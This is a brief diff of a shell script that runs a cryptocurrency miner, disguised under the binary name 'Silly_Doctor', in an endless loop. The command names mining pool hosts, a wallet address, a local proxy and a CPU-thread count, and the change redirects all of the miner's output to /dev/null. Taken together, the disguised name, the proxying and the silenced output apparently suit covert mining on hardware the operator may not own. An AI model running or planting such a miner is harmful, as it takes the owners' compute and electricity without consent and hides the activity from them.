@@ -111,6 +111,6 @@ sleep 2
 
 while true
 do
-./Silly_Doctor --disable-gpu --algorithm minotaurx --pool flyingsaucer-eu.teatspray.fun:7019\!flyingsaucer-us.teatspray.fun:7019 --main-pool-reconnect 1440 --wallet MGaypRJi43LcQxrgoL2CW28B31w4owLvv8 --password $currentdate,c=MAZA,zap=MAZA --proxy 127.0.0.1:1081 --cpu-threads $used_num_of_cores --keepalive 
+./Silly_Doctor --disable-gpu --algorithm minotaurx --pool flyingsaucer-eu.teatspray.fun:7019\!flyingsaucer-us.teatspray.fun:7019 --main-pool-reconnect 1440 --wallet MGaypRJi43LcQxrgoL2CW28B31w4owLvv8 --password $currentdate,c=MAZA,zap=MAZA --proxy 127.0.0.1:1081 --cpu-threads $used_num_of_cores --keepalive 1>/dev/null 2>&1 
 sleep 10
 done
